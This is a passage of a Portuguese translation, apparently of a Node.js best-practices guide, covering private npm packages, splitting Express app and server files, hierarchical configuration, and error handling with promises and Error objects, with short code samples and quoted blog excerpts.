<p>Quando você começa a crescer e tem componentes diferentes em servidores diferentes que consomem utilitários semelhantes, você deve começar a gerenciar as dependências - como você pode manter uma cópia do código do utilitário e permitir que vários componentes do consumidor a usem e implantem? Bem, existe uma ferramenta para isso, ele é chamado npm … Comece por encapsular pacotes de utilitários de terceiros com seu próprio código para torná-los facilmente substituíveis no futuro e publicar seu próprio código como pacote npm privado. Agora, toda a sua base de código pode importar esse código e se beneficiar da ferramenta gratuita de gerenciamento de dependências. É possível publicar pacotes npm para seu uso privado sem compartilhá-lo publicamente usando <a href="https://docs.npmjs.com/private-modules/intro" target="_blank" rel="nofollow noopener noreferrer">módulos privados</a>, <a href="https://npme.npmjs.com/docs/tutorials/npm-enterprise-with-nexus.html" target="_blank" rel="nofollow noopener noreferrer">registros privados</a> ou <a href="https://medium.com/@arnaudrinquin/build-modular-application-with-npm-local-modules-dfc5ff047bcc" target="_blank" rel="nofollow noopener noreferrer">pacotes npm locais</a></p>
<h3>Compartilhando seus próprios utilitários comuns em ambientes e componentes</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/Privatenpm.png?raw=true" alt="alt text" title="Solução de estruturação por componentes"></p>
<h2>1.4 Separe ‘app’ e ‘server’ no Express</h2>
<p><strong>TL;DR:</strong> Evite o péssimo hábito de definir todo a aplicação <a href="https://expressjs.com/" target="_blank" rel="nofollow noopener noreferrer">Express</a> em um único arquivo enorme - separe a definição de seu ‘Express’ no mínimo em dois arquivos: a declaração da API (app.js) e as configurações de rede (WWW). Para uma estrutura ainda melhor, declare sua API dentro dos componentes.</p>
<p><strong>Caso contrário:</strong> Sua API será acessível apenas para testes via chamadas HTTP (mais lentos e muito mais difíceis de gerar relatórios de cobertura). Provavelmente não será um grande prazer manter centenas de linhas de código em um único arquivo.</p>
<h1>Separe ‘app’ e ‘server’ no Express</h1>
<h3>Explicação em um Parágrafo</h3>
<p>O gerador mais recente do Express vem com uma ótima prática que vale a pena manter - a declaração da API é separada da configuração relacionada à rede (porta, protocolo, etc). Isso permite testar a API durante o processo, sem realizar chamadas de rede, com todos os benefícios que ela traz para a mesa: execução rápida de testes e obtenção de métricas de cobertura do código. Ele também permite implantar a mesma API em condições de rede flexíveis e diferentes. Bônus: melhor separação de preocupações e código mais limpo.</p>
<h3>Exemplo de código: declaração de API, deve residir em app.js</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/api/events"</span><span class="token punctuation">,</span> events<span class="token punctuation">.</span><span class="token constant">API</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/api/forms"</span><span class="token punctuation">,</span> forms<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código: declaração de rede do servidor, deve residir em /bin/www</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../app'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * Obtenha porta do ambiente e armazene no Express.
 */</span>

<span class="token keyword">var</span> port <span class="token operator">=</span> <span class="token function">normalizePort</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token string">'3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'port'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * Crie um servidor HTTP.
 */</span>

<span class="token keyword">var</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo: teste sua API em processo usando o superteste (pacote de teste popular)</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/user'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'tobi'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">request</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/user'</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">json</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">'Content-Length'</span><span class="token punctuation">,</span> <span class="token string">'15'</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">throw</span> err<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>1.5 Use configuração consciente, segura e hierárquica do ambiente</h2>
<p><strong>TL;DR:</strong> Uma definição de configuração perfeita e impecável deve garantir que (a) as chaves possam ser lidas a partir do arquivo E TAMBÉM da variável de ambiente (b) os segredos sejam mantidos fora do código consolidado (c) a configuração é hierárquica para facilitar a localização. Existem alguns pacotes que podem auxiliar na checagem destes tópicos, como <a href="https://www.npmjs.com/package/rc" target="_blank" rel="nofollow noopener noreferrer">rc</a>, <a href="https://www.npmjs.com/package/nconf" target="_blank" rel="nofollow noopener noreferrer">nconf</a>, <a href="https://www.npmjs.com/package/config" target="_blank" rel="nofollow noopener noreferrer">config</a> e <a href="https://www.npmjs.com/package/convict" target="_blank" rel="nofollow noopener noreferrer">convict</a></p>
<p><strong>Caso contrário:</strong> Deixar de satisfazer qualquer um dos requisitos de configuração simplesmente atrapalhará a equipe de desenvolvimento ou devops. Provavelmente ambas.</p>
<h1>Use configuração consciente, segura e hierárquica do ambiente</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Ao lidar com dados de configuração, muitas coisas podem simplesmente incomodar e desacelerar:</p>
<ol>
<li>A configuração de todas as chaves usando variáveis ​​de ambiente de processo torna-se muito entediante quando é necessário injetar 100 chaves (em vez de apenas cometer aquelas em um arquivo de configuração), no entanto, ao lidar com arquivos, os administradores do DevOps não podem alterar o comportamento sem alterar o código. Uma solução de configuração confiável deve combinar os dois arquivos de configuração + substituições das variáveis ​​de processo.</li>
<li>Ao especificar todas as chaves em um JSON simples, é frustrante encontrar e modificar entradas quando a lista ficar maior. Um arquivo JSON hierárquico que é agrupado em seções pode superar esse problema + poucas bibliotecas de configuração permitem armazenar a configuração em vários arquivos e tomar cuidado para unir todas em tempo de execução. Veja o exemplo abaixo.</li>
<li>O armazenamento de informações confidenciais, como a senha do banco de dados, obviamente não é recomendado, mas não existe uma solução rápida e prática para esse desafio. Algumas bibliotecas de configuração permitem criptografar arquivos, outras criptografam essas entradas durante as confirmações do GIT ou simplesmente não armazenam valores reais para essas entradas e especificam o valor real durante a implementação por meio de variáveis ​​de ambiente.</li>
<li>Alguns cenários de configuração avançada exigem a injeção de valores de configuração via linha de comando (vargs) ou informações de configuração de sincronização por meio de um cache centralizado, como o Redis, para que vários servidores usem os mesmos dados de configuração.</li>
</ol>
<p>Algumas bibliotecas de configuração podem fornecer a maioria desses recursos gratuitamente, dê uma olhada nas bibliotecas npm como <a href="https://www.npmjs.com/package/rc" target="_blank" rel="nofollow noopener noreferrer">rc</a>, <a href="https://www.npmjs.com/package/nconf" target="_blank" rel="nofollow noopener noreferrer">nconf</a>, <a href="https://www.npmjs.com/package/config" target="_blank" rel="nofollow noopener noreferrer">config</a> e <a href="https://www.npmjs.com/package/convict" target="_blank" rel="nofollow noopener noreferrer">convict</a> que satisfazem muitos desses requisitos.</p>
<h3>Exemplo de código - configuração hierárquica ajuda a encontrar entradas e manter arquivos de configuração enormes</h3>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token punctuation">{</span>
  <span class="token comment">// Configurações do módulo do cliente </span>
  <span class="token string">"Customer"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string">"dbConfig"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">"host"</span><span class="token operator">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>
      <span class="token string">"port"</span><span class="token operator">:</span> <span class="token number">5984</span><span class="token punctuation">,</span>
      <span class="token string">"dbName"</span><span class="token operator">:</span> <span class="token string">"customers"</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">"credit"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">"initialLimit"</span><span class="token operator">:</span> <span class="token number">100</span><span class="token punctuation">,</span>
      <span class="token comment">// Definir baixo para desenvolvimento </span>
      <span class="token string">"initialDays"</span><span class="token operator">:</span> <span class="token number">1</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h1><code class="language-text">2. Práticas de Tratamento de Erros</code></h1>
<h2>2.1 Utilize Async-Await ou promises para tratamento de erros assíncronos</h2>
<p><strong>TL;DR:</strong> Tratar erros assíncronos no estilo callback provavelmente é o caminho mais rápido para o inferno (também conhecido como a pyramid of doom - ou pirâmide da desgraça em bom português). O melhor presente que você pode dar ao seu código é utilizar uma biblioteca respeitável de promise ou async-await, que proporciona uma sintaxe de código muito mais compacta e familiar, como o try-catch.</p>
<p><strong>Caso contrário:</strong> O estilo de callback do Node.js, function(err, response), é um caminho promissor para um código insustentável devido à combinação de manipulação de erro com código casual, aninhamento excessivo e padrões de codificação inadequados.</p>
<h1>Use Async-Await ou promises para tratamento de erros assíncronos</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Callbacks não tem uma boa escalabilidade, pois a maioria dos programadores não tem familiaridade com elas. Elas forçam a verificar erros em toda parte, lidar com aninhamento de código desagradável e tornam difícil o entendimento do fluxo de código. Bibliotecas de promise como BlueBird, async, e Q possuem um estilo de código padrão usando RETURN e THROW para controlar o fluxo do programa. Especificamente, eles suportam o estilo favorito de manipulação de erro try-catch que permite liberar o caminho principal do código de lidar com erros em todas as funções.</p>
<h3>Exemplo de código - usando promises para capturar erros</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token function">doWork</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>doWork<span class="token punctuation">)</span>
 <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>doOtherWork<span class="token punctuation">)</span>
 <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token operator">=></span> doWork<span class="token punctuation">)</span>
 <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span><span class="token keyword">throw</span> error<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
 <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>verify<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código anti-padrão - manipulação de erro no estilo callback</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token function">getData</span><span class="token punctuation">(</span>someParameter<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>err <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// fazer algo como chamar a função de retorno de chamada e passar o erro</span>
        <span class="token function">getMoreData</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>err <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// fazer algo como chamar a função de retorno de chamada e passar o erro</span>
                <span class="token function">getMoreData</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token function">getMoreData</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">if</span><span class="token punctuation">(</span>err <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token comment">// Você entendeu a ideia? </span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de Blog: “Temos um problema com promises”</h3>
<p> Do blog pouchdb.com</p>
<blockquote>
<p>……E, de fato, callbacks fazem algo ainda mais sinistro: eles nos privam do stack, que é algo que costumamos dar como certo em linguagens de programação. Escrever código sem um stack é como dirigir um carro sem pedal de freio: você não percebe o quanto você precisa até tentar usá-lo e não está lá. O ponto principal das promises é nos devolver os fundamentos da linguagem que perdemos quando usamos código assíncrono: return, throw, e o stack. Mas você precisa saber como usar promises corretamente para tirar proveito delas.</p>
</blockquote>
<h3>Citação de Blog: “O método das promises é muito mais compacto”</h3>
<p> Do blog gosquared.com</p>
<blockquote>
<p>………O método das promises é muito mais compacto, claro e rápido de escrever. Se um erro ou exceção ocorrer em qualquer uma das operações, ele será tratado pelo único manipulador .catch (). Ter esse único local para lidar com todos os erros significa que você não precisa escrever uma verificação de erros para cada etapa do trabalho.</p>
</blockquote>
<h3>Citação de Blog: “Promises são nativas do ES6, podem ser usadas com generators”</h3>
<p> Do blog StrongLoop</p>
<blockquote>
<p>….Callbacks têm um péssimo histórico em manipulação de erros. Promises são melhores. Case com o tratamento de erro interno no Express com promises e reduza significativamente as chances de uma exceção não capturada. Promises são nativas do ES6, podem ser usadas com generators, e propostas do ES7 como async/await através de compiladores como Babel</p>
</blockquote>
<h3>Citação de Blog: “Todas aquelas construções de controle de fluxo regulares que você está acostumado estão completamente quebradas”</h3>
<p>Do blog Benno’s</p>
<blockquote>
<p>……Uma das melhores coisas sobre a programação assíncrona baseada em callbacks é que basicamente todas as construções de controle de fluxo regulares que você está acostumado estão completamente quebradas. No entanto, a que eu acho mais quebrada é o tratamento de exceções. Javascript fornece uma construção bastante familiar de try…catch para lidar com exceções. O problema com exceções é que elas fornecem uma ótima maneira de reduzir erros em um stack de chamadas, mas acabam sendo completamente inúteis se o erro acontece em uma pilha diferente…</p>
</blockquote>
<h2>2.2 Utilize apenas objetos de erro interno</h2>
<p><strong>TL;DR:</strong> Muitos geram erros como uma string ou como algum tipo personalizado - isso complica a lógica de tratamento de erros e a interoperabilidade entre módulos. Se você rejeita uma promise, lance uma mensagem de erro ou uma exceção - utilizando somente o objeto de erro interno aumentará a uniformidade e evitará a perda de informações.</p>
<p><strong>Caso contrário:</strong> Ao invocar algum componente, sendo incerto qual tipo de erro irá retornar - isso faz com que o tratamento de erros seja muito mais difícil. Até pior, usar tipos personalizados para descrever erros pode levar à perda de informações de erros críticos, como o stack trace!</p>
<h1>Utilize apenas o objeto interno Error</h1>
<h3>Explicação em um Parágrafo</h3>
<p>A natureza permissiva do JS junto com sua variedade de opções de fluxo de código (por exemplo, EventEmitter, Callbacks, Promises, etc) cria uma grande variação em como os desenvolvedores lidam com erros – alguns usam strings, outros definem os próprios tipos customizados. Usar o objeto interno Error do Node.js ajuda a manter a uniformidade dentro do seu código e com bibliotecas de terceiros, também preserva informações significativas como o rastreamento de stack. Ao gerar a exceção, geralmente é uma boa prática preenchê-la com propriedades contextuais adicionais, como o nome do erro e o código de erro HTTP associado. Para obter essa uniformidade e práticas, considere estender o objeto de erro com propriedades adicionais, consulte o exemplo de código abaixo</p>
<h3>Exemplo de código - fazendo certo</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// jogando um Error de uma função típica, seja síncrona ou assíncrona</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>productToAdd<span class="token punctuation">)</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Como posso adicionar um novo produto quando nenhum valor é fornecido?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 'jogando' um Error de um EventEmitter</span>
<span class="token keyword">const</span> myEmitter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyEmitter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myEmitter<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'whoops!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 'jogando' um Error de uma Promise</span>
<span class="token keyword">const</span> <span class="token function-variable function">addProduct</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">productToAdd</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> existingProduct <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token constant">DAL</span><span class="token punctuation">.</span><span class="token function">getProduct</span><span class="token punctuation">(</span>productToAdd<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>existingProduct <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"O produto já existe!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// ...</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código – Anti padrão</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// lançar uma string não possui informações de rastreamento de stack e outras propriedades de dados importantes</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>productToAdd<span class="token punctuation">)</span>
    <span class="token keyword">throw</span> <span class="token punctuation">(</span><span class="token string">"Como posso adicionar um novo produto quando nenhum valor é fornecido?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código - fazendo isso ainda melhor</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Objeto de erro centralizado que deriva do Error do Node</span>
<span class="token keyword">function</span> <span class="token function">AppError</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> httpCode<span class="token punctuation">,</span> description<span class="token punctuation">,</span> isOperational</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">Error</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Error<span class="token punctuation">.</span><span class="token function">captureStackTrace</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token comment">//...outras propriedades atribuídas aqui</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token class-name">AppError</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Error</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">AppError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> AppError<span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>AppError <span class="token operator">=</span> AppError<span class="token punctuation">;</span>

<span class="token comment">// cliente jogando uma exceção</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>user <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AppError</span><span class="token punctuation">(</span>commonErrors<span class="token punctuation">.</span>resourceNotFound<span class="token punctuation">,</span> commonHTTPErrors<span class="token punctuation">.</span>notFound<span class="token punctuation">,</span> <span class="token string">"mais explicações"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de Blog: “Não vejo o valor em ter vários tipos diferentes”</h3>
<p>Do blog, Ben Nadel classificado como 5 para as palavras-chave “Node.js error object”</p>
<blockquote>
<p>…”Pessoalmente, não vejo o valor em ter vários tipos diferentes de objetos de erro – JavaScript, como uma linguagem, não parece atender à captura de erros baseada em construtor. Como tal, diferenciar em uma propriedade de objeto parece muito mais fácil do que diferenciar em um tipo Construtor…</p>
</blockquote>
<h3>Citação de Blog: “Uma string não é um erro”</h3>
<p>Do blog, devthought.com classificado como 6 para as palavras-chave “Node.js error object”</p>
<blockquote>
<p>…passar uma string em vez de um erro resulta em interoperabilidade reduzida entre os módulos. Isso quebra relações com APIs que podem estar realizando checagens <code class="language-text">instanceof</code> Error, ou que querem saber mais sobre o erro. Objetos Error, como veremos, têm propriedades muito interessantes em mecanismos modernos de JavaScript, além de manter a mensagem transmitida ao construtor…</p>
</blockquote>
<h3>Citação de Blog: “Herdar de Error não adiciona muito valor”</h3>
<p>Do blog machadogj</p>
<blockquote>
<p>…Um problema que eu tenho com a classe Error é que não é tão simples estendê-la. Claro, você pode herdar a classe e criar suas próprias classes Error como HttpError, DbError, etc. No entanto, isso leva tempo e não acrescenta muito valor, a menos que você esteja fazendo algo com tipos. Às vezes, você só quer adicionar uma mensagem e manter o erro interno, e às vezes você pode querer estender o erro com parâmetros, e tal…</p>
</blockquote>
<h3>Citação do Blog: “Todos os erros do sistema e do JavaScript levantados pelo Node.js herdam de Error”</h3>
<p>Da documentação oficial do Node.js</p>
<blockquote>
<p>…Todos os erros de JavaScript e do sistema gerados pelo Node.js herdam ou são instâncias da classe padrão Error do JavaScript e têm a garantia de fornecer pelo menos as propriedades disponíveis nessa classe. Um objeto genérico Erro de JavaScript que não denota nenhuma circunstância específica de por que o erro ocorreu. Objetos Error capturam um “rastreamento de stack” detalhando o ponto no código no qual o Erro foi instanciado e podem fornecer uma descrição do erro em texto. Todos os erros gerados pelo Node.js, incluindo todos os erros de sistema e JavaScript, serão instâncias ou herdarão da classe Error…</p>
</blockquote>
<h2>2.3 Diferencie erros operacionais vs erros de programação</h2>
<p><strong>TL;DR:</strong> Erros operacionais (ex: API recebeu um input inválido) referem-se a casos onde o impacto do erro é totalmente compreendido e pode ser tratado com cuidado. Por outro lado, erro de programação (ex: tentar ler uma variável não definida) refere-se a falhas de código desconhecidas que ditam para reiniciar a aplicação.</p>
<p><strong>Caso contrário:</strong> Você pode sempre reiniciar o aplicativo quando um erro aparecer, mas por que derrubar aproximadamente 5000 usuários que estavam online por causa de um pequeno erro operacional previsto? O contrário também não é ideal - manter a aplicação rodando quando um problema desconhecido (erro de programação) ocorreu, pode levar para um comportamento não esperado. Diferenciá-los, permite agir com tato e aplicar uma abordagem equilibrada baseada no dado contexto.</p>
<h1>Diferencie erros operacionais vs erros de programação</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Distinguir os dois tipos de erros a seguir minimizará o tempo de inatividade do seu aplicativo e ajudará a evitar bugs insanos: Erros operacionais referem-se a situações em que você entende o que aconteceu e o impacto disso – por exemplo, uma consulta a algum serviço HTTP falhou devido a um problema de conexão. Por outro lado, os erros do programador referem-se a casos em que você não tem idéia do motivo e, às vezes, de onde um erro ocorreu – Pode ser algum código que tentou ler um valor indefinido ou um conjunto de conexões de banco de dados que vaze memória. Erros operacionais são relativamente fáceis de lidar – geralmente registrar o erro é o suficiente. As coisas ficam complicadas quando um erro do programador aparece, o aplicativo pode estar em um estado inconsistente e não há nada melhor que você possa fazer do que reiniciar normalmente.</p>
<h3>Exemplo de código - marcando um erro como operacional (confiável)</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// marcando um objeto de erro como operacional </span>
